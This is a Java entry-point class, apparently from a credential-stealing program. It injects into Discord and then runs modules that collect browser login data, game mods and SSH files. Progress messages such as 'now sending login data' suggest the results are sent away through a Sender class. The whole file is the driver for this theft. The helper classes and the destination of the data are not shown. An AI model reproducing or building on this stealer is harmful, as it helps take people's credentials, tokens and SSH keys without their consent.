package io.github.luxotick;

import io.github.luxotick.impl.Browsers;
import io.github.luxotick.impl.DiscordInjector;
import io.github.luxotick.impl.Mods;
import io.github.luxotick.Sender;
import io.github.luxotick.impl.Ssh;

public class Start {
	public static void main(String[] argument) throws Exception {
		if (DiscordInjector.instance == null){
			DiscordInjector.instance = new DiscordInjector();
		}
		//DiscordInjector.instance.initialize();
		Sender.sendMessage("Done discord injecting, now sending login data");
		Browsers.main(argument);
		Sender.sendMessage("Done sending browsers, now sending mods");
		Mods.main(argument);
		Sender.sendMessage("Done sending mods, now looking for ssh files");
		Ssh.main(argument);
	}
	
}